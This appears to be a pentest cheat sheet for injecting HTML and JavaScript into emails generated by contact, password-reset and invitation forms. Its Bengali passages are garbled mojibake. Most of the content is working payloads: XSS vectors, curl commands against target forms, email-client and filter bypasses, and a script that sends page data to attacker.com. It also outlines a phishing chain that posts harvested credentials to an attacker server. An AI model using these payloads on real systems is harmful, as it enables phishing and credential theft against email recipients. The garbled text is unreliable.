Email HTML Injection - authorized pentest à¦à¦° à¦œà¦¨à§à¦¯ perfectà¥¤ Email client context à¦ JS execution + phishing à¦à¦° massive impactà¥¤ à¦¸à¦¬ feature test à¦•à¦°à§‹ systematicallyà¥¤

ğŸ¯ Attack Surface Mapping
1. Contact forms, support tickets
2. Password reset flows  
3. Account verification emails
4. User invitation/referral
5. Notification preferences (name, signature)
6. Admin notifications (user reports)

ğŸ” Injection Points Enumeration
Step 1: Input Discovery
User fields to test:
- Full Name
- Username/Display Name  
- Email Signature
- Company Name
- Message Subject/Body
- Custom greeting
- Profile picture URL

Step 2: HTML Injection Testing
Basic payloads:
"><img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

Advanced:
<script>fetch('https://attacker.com/log?email='+location.href)</script>
<iframe src=javascript:alert(document.domain)>

ğŸ› ï¸ Testing Methodology
Burp Suite Workflow
1. Proxy â†’ à¦¸à¦¬ form submission capture
2. Repeater â†’ Name/Message fields à¦ HTML payloads
3. Wait â†’ Email delivery (5-15 mins)
4. Check â†’ Victim email account (your test account)
5. Verify â†’ JS execution + external callbacks

Form Testing
bash
# Contact form injection
curl -X POST "https://target.com/contact" \
  -d "name=<img src=x onerror=alert(1)>&email=test@yourdomain.com&message=test" \
  -b "session=your_session_cookie"

# Password reset
curl -X POST "https://target.com/reset" \
  -d "email=test@yourdomain.com&name=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"

ğŸ”¥ Exploitation Impact
1. JS Execution in Email Client
âœ… Gmail/Yahoo/Outlook context
âœ… Cross-origin tracking (no CORS)
âœ… LocalStorage/SessionStorage access
âœ… Phishing link generation

2. Phishing Chain
1. Victim opens email â†’ JS executes
2. Beacon pixel â†’ attacker.com/track?victim_email
3. Fake login form overlay
4. Credentials POST â†’ attacker server

ğŸ’¥ Safe PoC Demonstration
Collaborator Integration
html
<!-- Injected payload -->
<img src="https://your-unique-id.oastify.com/pixel.gif?victim=js-executed">
<script>
fetch('https://your-unique-id.oastify.com/log', {
  method: 'POST',
  body: JSON.stringify({
    domain: location.hostname,
    userAgent: navigator.userAgent
  })
});
</script>

Evidence Collection
1. Request: POST /contact (HTML payload)
2. Email received: Screenshot with injected content
3. Collaborator: DNS/HTTP interaction proof
4. HAR file: Complete request chain
5. Video: Email open â†’ callback hit

ğŸ“‹ Complete Test Matrix
Field	Basic Test	JS Test	External Resource
Name	<b>bold</b>	<script>alert(1)</script>	<img src=//oastify.com>
Subject	Test	"><script>confirm(1)</script>	``
Message	<p>para</p>	<svg onload=alert(1)>	<iframe src=//oastify.com>
Signature	``	<details ontoggle=alert(1)>	<link rel=stylesheet href=//evil.com/css>

ğŸ”„ Email Client Bypass
1. Gmail Safe Mode Bypass
<details open ontoggle=alert(String.fromCharCode(68,79,77,65,73,78))>
<svg><animatetransform onbegin=alert(1)>

2. Outlook/Apple Mail
<body onload=alert(1)>
<a href=javascript:alert(1)>Click</a>

ğŸš€ Automation + Monitoring
bash
#!/bin/bash
# Submit payloads
curl -X POST "https://target.com/contact" \
  -d "name=<img src=https://oastify.com/pixel.gif>&email=test@yourdomain.com"

# Monitor collaborator
watch -n 5 'curl https://your-unique-id.oastify.com/history'

ğŸ›¡ï¸ Bypass Filters
# HTML entity encoding
&lt;img src=x onerror=alert(1)&gt;

# Case variation
<IMG SRC=x OnError=alert(1)>
<ScRiPt>alert(1)</ScRiPt>

# Unicode
\u003cscript\u003ealert(1)\u003c/script\u003e

ğŸ“Š Impact Scoring
CVSS Base: 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

Real Impact:
âœ… Universal XSS (all email clients)
âœ… Account enumeration (open rates)
âœ… Phishing infrastructure
âœ… Credential harvesting

âš ï¸ Pentest Best Practices
âœ… Use YOUR controlled email (test@yourdomain.com)
âœ… Burp Collaborator for callbacks  
âœ… Video record: Request â†’ Email â†’ JS execution
âœ… Multiple clients test: Gmail/Outlook/Yahoo
âœ… Admin notifications target à¦•à¦°à§‹ (higher impact)

Golden Targets:
Password reset email (name field)
Contact support (admin receives)
User invitation (colleagues receive)
Account verification (new users)
Pro Tip: Content-Type: text/html header manipulate à¦•à¦°à§‹ form submission à¦à¥¤ Admin dashboard à¦à¦° notification settings à¦šà§‡à¦• à¦•à¦°à§‹à¥¤
